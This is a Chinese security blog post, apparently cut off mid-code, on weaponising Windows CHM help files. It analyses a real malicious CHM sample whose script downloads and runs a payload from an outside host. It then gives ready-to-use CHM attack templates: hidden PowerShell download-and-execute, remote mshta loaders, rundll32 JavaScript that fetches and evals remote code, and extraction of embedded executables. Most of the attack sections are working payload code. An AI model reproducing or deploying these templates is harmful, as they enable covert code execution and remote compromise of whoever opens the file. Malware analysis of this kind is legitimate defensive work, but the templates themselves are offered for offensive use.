class="string">&quot;GENERATOR&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Microsoft® HTML Help Workshop 4.1&quot;</span>&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!-- Sitemap 1.0 --&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">BODY</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/site properties&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;ImageType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Folder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">UL</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">LI</span>&gt;</span> <span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Test&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Local&quot;</span> <span class="attr">value</span>=<span class="string">&quot;poc.html&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;ImageNumber&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">UL</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="编译CHM文件"><a href="#编译CHM文件" class="headerlink" title="编译CHM文件"></a>编译CHM文件</h2><p>使用<code>hhc.exe</code> 编译hhp文件即可。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hhc.exe <span class="tag">&lt;<span class="name">目标hhp文件</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="反编译CHM文件"><a href="#反编译CHM文件" class="headerlink" title="反编译CHM文件"></a>反编译CHM文件</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hh.exe  -decompile &lt;输出路径&gt; &lt;目标chm文件&gt;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-真实案例分析"><a href="#0x02-真实案例分析" class="headerlink" title="0x02 真实案例分析"></a>0x02 真实案例分析</h1><p>在吾爱论坛上找到一个恶意样本，该恶意程序执行后会释放BAT文件并执行、一个CHM文件。（原样本是COM程序，这里只简单分析一下CHM文件）</p>
<p>这里用自带的hh.exe反编译就能获取到文件，看看反编译出来的文件就知道，这个CHM文件是用Easy CHM打包的。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:29:34-_dkiyBX_CHMFile_0_dkiyBX_1642066174124_dkiyBX_CHMFile_0.png" alt="20220113-17:29:34-_dkiyBX_CHMFile_0_dkiyBX_1642066174124_dkiyBX_CHMFile_0"></p>
<p>看看hhk索引，没啥特别，hhc文件和这个差不多。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML//EN&quot;</span>&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;meta <span class="keyword">name</span>=<span class="string">&quot;GENERATOR&quot;</span> content=<span class="string">&quot;EasyCHM.exe  www.zipghost.com&quot;</span>&gt;</span><br><span class="line">&lt;!-- Sitemap <span class="number">1.0</span> --&gt;</span><br><span class="line">&lt;/HEAD&gt;&lt;BODY&gt;</span><br><span class="line">&lt;UL&gt;</span><br><span class="line">	&lt;LI&gt; &lt;OBJECT type=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span><br><span class="line">		&lt;param <span class="keyword">name</span>=<span class="string">&quot;Name&quot;</span> value=<span class="string">&quot;1.html&quot;</span>&gt;</span><br><span class="line">		&lt;param <span class="keyword">name</span>=<span class="string">&quot;Local&quot;</span> value=<span class="string">&quot;1.html&quot;</span>&gt;</span><br><span class="line">		&lt;/OBJECT&gt;</span><br><span class="line">	&lt;LI&gt; &lt;OBJECT type=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span><br><span class="line">		&lt;param <span class="keyword">name</span>=<span class="string">&quot;Name&quot;</span> value=<span class="string">&quot;2.html&quot;</span>&gt;</span><br><span class="line">		&lt;param <span class="keyword">name</span>=<span class="string">&quot;Local&quot;</span> value=<span class="string">&quot;2.html&quot;</span>&gt;</span><br><span class="line">		&lt;/OBJECT&gt;</span><br><span class="line">&lt;/UL&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p>1.html（主要恶意文件）</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    (function() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">window</span>.atob)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            var Base64 = <span class="keyword">window</span>.Base64 || &#123;</span><br><span class="line">                /*省略部分代码，此处代码为base64的编码解码实现，猜测是为了掩人耳目*/</span><br><span class="line">    &#125;)();</span><br><span class="line"> </span><br><span class="line">    function debug(s) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">window</span>.console)console.<span class="keyword">log</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">var dotnet4 = function(path, execuablePath, downloadPath) &#123;</span><br><span class="line">		/* dotnet4 这一块函数是用了这个DotNetToJScript工具，通过反序列化加载执行.NET程序，代码基本相同*/</span><br><span class="line">    /* 仓库的测试程序是弹窗，不过这里攻击者应该是重写了入口函数，使其能够下载恶意文件并执行，由于请求的url已经关站，故无法对下载的文件进行下一步分析*/</span><br><span class="line"></span><br><span class="line">    var invokeSuccess = false;</span><br><span class="line"></span><br><span class="line">    function setversion() &#123;</span><br><span class="line">        <span class="keyword">new</span> ActiveXObject(<span class="comment">&#x27;WScript.Shell&#x27;).Environment(&#x27;Process&#x27;)(&#x27;COMPLUS_Version&#x27;) = &#x27;v2.0.50727&#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function base64ToStream(b) &#123;</span><br><span class="line">        var enc = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;System.Text.ASCIIEncoding&quot;</span>);</span><br><span class="line">        var length = enc.GetByteCount_2(b);</span><br><span class="line">        var ba = enc.GetBytes_4(b);</span><br><span class="line">        var transform = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;System.Security.Cryptography.FromBase64Transform&quot;</span>);</span><br><span class="line">        ba = transform.TransformFinalBlock(ba, <span class="number">0</span>, length);</span><br><span class="line">        var ms = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;System.IO.MemoryStream&quot;</span>);</span><br><span class="line">        ms.<span class="keyword">Write</span>(ba, <span class="number">0</span>, (length / <span class="number">4</span>) * <span class="number">3</span>);</span><br><span class="line">        ms.Position = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> ms;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	//（此处省略了部分。）</span><br><span class="line">	var serialized_obj = <span class="string">&quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;</span>+</span><br><span class="line">    <span class="string">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;</span>+</span><br><span class="line">    <span class="string">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;</span>+</span><br><span class="line">    <span class="string">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;</span>+</span><br><span class="line">    <span class="string">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;</span>+</span><br><span class="line">    <span class="string">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;</span>+</span><br><span class="line">    <span class="string">&quot;AAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxlY3Rp&quot;</span>+</span><br><span class="line">    <span class="string">&quot;b24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL&quot;</span>;</span><br><span class="line">    var entry_class = <span class="comment">&#x27;TestClass&#x27;;</span></span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        setversion();</span><br><span class="line">        var stm = base64ToStream(serialized_obj);</span><br><span class="line">        var fmt = <span class="keyword">new</span> ActiveXObject(<span class="comment">&#x27;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#x27;);</span></span><br><span class="line">        var al = <span class="keyword">new</span> ActiveXObject(<span class="comment">&#x27;System.Collections.ArrayList&#x27;);</span></span><br><span class="line">        var d = fmt.Deserialize_2(stm);</span><br><span class="line">        al.Add(undefined);</span><br><span class="line">        var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</span><br><span class="line">        o.Cp(path, execuablePath, downloadPath);</span><br><span class="line">        invokeSuccess = true;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        debug(e.message);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> invokeSuccess;</span><br><span class="line">&#125;</span><br><span class="line">var href = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">// setTimeout(, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">window</span>.path = <span class="string">&quot;http://www.dgf6.cn:7231/105&quot;</span>;</span><br><span class="line"><span class="keyword">window</span>.execuablePath = <span class="string">&quot;11&quot;</span>;</span><br><span class="line"><span class="keyword">window</span>.downloadPath = <span class="string">&quot;C:\\Users\\Public\\6253&quot;</span>;</span><br><span class="line"></span><br><span class="line">//请求 http[:]//www.dgf6.cn:<span class="number">7231</span>/<span class="number">105</span>，下载恶意文件，释放到C:\\Users\\Public\\<span class="number">6253</span>，执行后跳转<span class="number">2</span>.html页面</span><br><span class="line">(function task() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var path = <span class="keyword">window</span>.path;</span><br><span class="line">        var execuablePath = <span class="keyword">window</span>.execuablePath;</span><br><span class="line">        var downloadPath = <span class="keyword">window</span>.downloadPath;</span><br><span class="line">        var isSuccessv4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        var isSuccessv2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        isSuccessv4 = dotnet4(path, execuablePath, downloadPath);</span><br><span class="line">   </span><br><span class="line">        <span class="keyword">if</span> (isSuccessv4) &#123;</span><br><span class="line">            location.href = <span class="string">&quot;2.html&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;&#125;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        debug(e.message + <span class="string">&quot;globalCode&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>2.html 就一张图片，没什么好说的。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">&quot;position:absolute; top:0px;left:0px; width:100%&quot;</span> src=<span class="string">&quot;http://img.youxiguancha.com/game/2015/01/12/1421043095_5.jpg&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>该恶意程序执行流程如下：</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:29:54-_apeq0N_CHMFile_1_apeq0N_1642066194260_apeq0N_CHMFile_1.png" alt="20220113-17:29:54-_apeq0N_CHMFile_1_apeq0N_1642066194260_apeq0N_CHMFile_1"></p>
<h1 id="0x03-基础攻击方式"><a href="#0x03-基础攻击方式" class="headerlink" title="0x03 基础攻击方式"></a>0x03 基础攻击方式</h1><h2 id="利用hhctrl-ocx对象命令执行"><a href="#利用hhctrl-ocx对象命令执行" class="headerlink" title="利用hhctrl.ocx对象命令执行"></a>利用hhctrl.ocx对象命令执行</h2><p>其实这里方法用的都是<code>ShortCut</code>这个功能，去实现的命令执行。</p>
<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>这里用的是MSF生成的payload，当然也可以直接用cs的，但是缺点是会弹个powershell执行的框。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;calc poc&lt;/title&gt;</span><br><span class="line">		&lt;head&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	command exec</span><br><span class="line">	&lt;OBJECT id=x classid=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="keyword">width</span>=<span class="number">1</span> height=<span class="number">1</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Command&quot;</span> value=<span class="string">&quot;ShortCut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Button&quot;</span> value=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item1&quot;</span> value=<span class="comment">&#x27;,powershell.exe, -nop -w hidden -e BASE64编码的字段&#x27;&gt;</span></span><br><span class="line"> &lt;!--&gt;&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item1&quot;</span> value=<span class="comment">&#x27;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&quot;http://xx.xx.xx.xx&quot;))&#x27;&gt; 这段payload也可以&lt;--&gt;</span></span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item2&quot;</span> value=<span class="string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="line">	&lt;/OBJECT&gt;</span><br><span class="line">	&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="hta"><a href="#hta" class="headerlink" title="hta"></a>hta</h3><p>通过shortcut调用远程hta文件，实现上线。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;calc poc&lt;/title&gt;</span><br><span class="line">		&lt;head&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	command exec</span><br><span class="line">	&lt;OBJECT id=x classid=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="keyword">width</span>=<span class="number">1</span> height=<span class="number">1</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Command&quot;</span> value=<span class="string">&quot;ShortCut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Button&quot;</span> value=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item1&quot;</span> value=<span class="comment">&#x27;,mshta, http://x.x.x.x/loader.hta&#x27;&gt;</span></span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item2&quot;</span> value=<span class="string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="line">	&lt;/OBJECT&gt;</span><br><span class="line">	&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="rundll32运行JS"><a href="#rundll32运行JS" class="headerlink" title="rundll32运行JS"></a>rundll32运行JS</h3><p>通过rundll32执行带ActiveXObject的javascript脚本实现上线。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;calc poc&lt;/title&gt;</span><br><span class="line">		&lt;head&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	command exec</span><br><span class="line">	&lt;OBJECT id=x classid=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="keyword">width</span>=<span class="number">1</span> height=<span class="number">1</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Command&quot;</span> value=<span class="string">&quot;ShortCut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Button&quot;</span> value=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item1&quot;</span> value=<span class="comment">&#x27;,rundll32.exe, javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://xx.xx.xx.xx&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&gt;</span></span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item2&quot;</span> value=<span class="string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="line">	&lt;/OBJECT&gt;</span><br><span class="line">	&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="释放文件并执行"><a href="#释放文件并执行" class="headerlink" title="释放文件并执行"></a>释放文件并执行</h2><p>以下代码示范了如何通过shortcut调用cmd命令，将CHM压缩的文件释放到本地指定目录后，再执行。</p>
<h3 id="hh释放文件Example"><a href="#hh释放文件Example" class="headerlink" title="hh释放文件Example"></a>hh释放文件Example</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;t0&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">getPath</span>(<span class="params"></span>)&#123; </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> pathName = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">pathname</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index0 = pathName.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">indexOf</span>(<span class="string">&quot;:&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index1 = pathName.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">lastIndexOf</span>(<span class="string">&quot;:&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> result = pathName.<span class="title function_">substr</span>(index0+<span class="number">2</span>,index1-index0-<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> result; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> dir = <span class="title function_">getPath</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> commodStr = <span class="string">&#x27;&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&#x27;</span> + <span class="string">&#x27;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;&#x27;</span> + <span class="string">&#x27;&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;&#x27;</span> + <span class="string">&#x27;&lt;PARAM name=&quot;Item1&quot; value=&quot;,hh, -decompile C:\\Windows\\Temp\\Downloads\\ &#x27;</span> + dir + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;t0&#x27;</span>).<span class="property">innerHTML</span> = commodStr;  </span></span><br><span class="line"><span class="language-javascript">x.<span class="title class_">Click</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用ActiveXObject对象判断文件是否存在，存在就打开。缺点，会提示ActiveXObject运行警告。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;t0&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="comment">&lt;!--&gt;获取目录&lt;--&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function getPath()&#123; </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var pathName = document.location.pathname;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var index0 = pathName.substr(1).indexOf(&quot;:&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var index1 = pathName.substr(1).lastIndexOf(&quot;:&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var result = pathName.substr(index0+2,index1-index0-2);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    return result; </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="comment">&lt;!--&gt;判断文件是否存在，存在就执行指定的文件。&lt;--&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function isHasFile()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	var a,s=&#x27;C:\\Windows\\Temp\\Downloads\\Test7Z1.exe&#x27;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	a = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	if(a.FileExists(s))</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		AUTO.Click();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">var dir = getPath();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">var commodStr = &#x27;<span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">unrar</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span 